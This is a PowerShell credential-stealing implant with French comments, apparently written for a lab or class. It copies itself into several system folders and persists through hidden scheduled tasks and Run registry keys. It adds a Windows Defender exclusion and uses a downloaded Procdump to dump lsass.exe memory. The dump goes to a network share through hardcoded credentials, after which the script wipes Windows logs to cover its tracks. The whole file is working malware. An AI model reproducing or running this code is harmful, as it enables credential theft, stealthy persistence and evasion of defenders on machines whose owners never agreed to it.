<#
ALGO
-Replicat dans dossier de étention
--planifi
--REG
--system::startup
--???

-execute mimikatz/lazagne/??/jsp
--Récupérer créddential

-Rendre FUD
#>
#Set-ExecutionPolicy Bypass

#Recupération des informations nécéssaire 
$Persit = ("C:$env:HOMEPATH\Charg.ps1", "$env:SystemRoot\Charg.ps1", "$env:ALLUSERSPROFILE\Charg.ps1")

#Copie du script un peu partout
foreach ($Pers in $Persit){
    Copy-Item $PSScriptRoot\Charg.ps1 $Pers
}


##############################################
#####       PERSISTANCE

#Variable de base
$MinuteBeforeTaskRepeat = 1
$PersistenceName = "laPetiteEstCharge"
$NameIncrement = 0 #Utile pour nommer les différentes task et clé

#Planificateur de tâche
foreach ($Pers in $Persit){
    $TaskRepeat = (New-TimeSpan -Minutes $MinuteBeforeTaskRepeat)
    $TaskDuration = ([timeSpan]::maxvalue)
    $Command = "Get-Content $Pers | Out-String | Invoke-Expression"
    $TaskAction = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -command $Command"
    $TaskTrigger =  @(
        $(New-ScheduledTaskTrigger -At 4am -Daily), 
        $(New-ScheduledTaskTrigger -At 9am -Daily),
        $(New-ScheduledTaskTrigger -At 12am -Daily),
        $(New-ScheduledTaskTrigger -At 4pm -Daily),  
        $(New-ScheduledTaskTrigger -At 9pm -Daily),
        $(New-ScheduledTaskTrigger -At 12pm -Daily), 
        $(New-ScheduledTaskTrigger -AtStartup), 
        $(New-ScheduledTaskTrigger -AtLogOn),
        $(New-ScheduledTaskTrigger -At (Get-Date).Date -Once -RepetitionInterval $TaskRepeat ) #-RepetitionDuration $TaskDuration
                                                                                           
    )
    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $PersistenceName$NameIncrement -RunLevel Highest
    $NameIncrement++
}

#Clés de registre
$RegPath = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
)

$NameIncrement = 0 #Réinitialisation de l'incrément de nom
foreach ($Pers in $Persit){
    foreach ($Reg in $RegPath){
        New-ItemProperty -Path $Reg -Name $PersistenceName$NameIncrement -PropertyType String -Value "Powershell.exe -WindowStyle Hidden -command 'Get-Content $Pers | Out-String | Invoke-Expression'"
    }
    $NameIncrement++
}



##############################################
#####       CHARGE

#Variable de base
$Arch = $env:PROCESSOR_ARCHITECTURE
$SimpleTimeStamp = Get-Date -UFormat "%Y%m%d%H%M%S"
$Path = "C:\users\$env:USERNAME\Documents"

#Création d'un dossier temporaire
New-Item -Path $Path -ItemType Directory -Name Temps
Add-MpPreference -Exclusionpath "$Path\Temps"

#Téléchargement de Procdump
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Procdump.zip -OutFile "$Path\Temps\procdump.zip"

#Unzip Procdump
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$Path\Temps\Procdump.zip", "$Path\Temps")

#Set la location afin de permettre à Procdump de récupérer lsass.exe sans soucis (Ne fonctionne pas avec un chemin, jsp pourquoi ¯\_(ツ)_/¯)
Set-Location C:\Windows\System32
cmd.exe /c "$Path\Temps\procdump.exe" -accepteula -ma lsass.exe "$Path\Temps\lsass"

#Récuparation des variables pour pouvoir envoyer le lsass.dmp par dossier partagé
$Username = "aston"
$Password = ConvertTo-SecureString "Passw0rd" -AsPlainText -Force
$MyCreds = New-Object System.Management.Automation.PSCredential($Username, $Password)
$Destination = "\\10.94.4.38\shared" #Dossier partagé (Pensez à en faire un caché)
$PSDriveName = "J"

New-PSDrive -Name $PSDriveName -PSProvider FileSystem -Root $Destination -Credential $mycreds

Copy-Item -Path "$Path\Temps\lsass.dmp" -Destination "$Destination\lsass$Arch$SimpleTimeStamp.dmp" -Force

#Netoyage des traces
Remove-PSDrive -Name $PSDriveName
Remove-Item -Path "$Path\Temps" -Recurse
Remove-MpPreference -Exclusionpath "$Path\Temps"

#clean logs
$Now = Get-Date -Minute 1
$LastWrite = $Now.AddDays(1)
$Files = get-childitem -Path C:\Windows\Logs\* -recurse |Where {$_.LastWriteTime -le "$LastWrite"} 
foreach ($File in $Files){
    Remove-Item $File | out-null
}